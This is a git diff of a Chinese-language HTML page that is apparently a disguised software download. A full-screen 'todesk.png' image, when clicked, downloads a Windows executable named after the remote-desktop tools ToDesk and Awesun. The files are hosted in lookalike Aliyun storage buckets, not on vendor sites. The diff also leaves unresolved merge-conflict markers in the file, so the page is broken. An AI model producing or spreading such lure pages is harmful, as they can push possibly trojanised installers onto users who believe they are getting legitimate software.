@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
+<<<<<<< HEAD
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>XRK网站</title>
@@ -64,5 +65,36 @@
             window.location.href = 'https://awesunl.oss-cn-hongkong.aliyuncs.com/Awesun_15.6.5.1.exe';
         }
     </script>
+=======
+  <meta charset="UTF-8">
+  <title>图片跳转页面</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+    body {
+      width: 100vw;
+      height: 100vh;
+    }
+    #main-img {
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      cursor: pointer;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <img id="main-img" src="todesk.png" alt="主图">
+  <script>
+    document.getElementById('main-img').onclick = function() {
+      window.location.href = 'https://todesk1.oss-cn-hongkong.aliyuncs.com/Todesk_6.2.3.exe';
+    }
+  </script>
+>>>>>>> 579aa909d5928b2477d1eada1d3f9a312531a6ed
 </body>
 </html> 
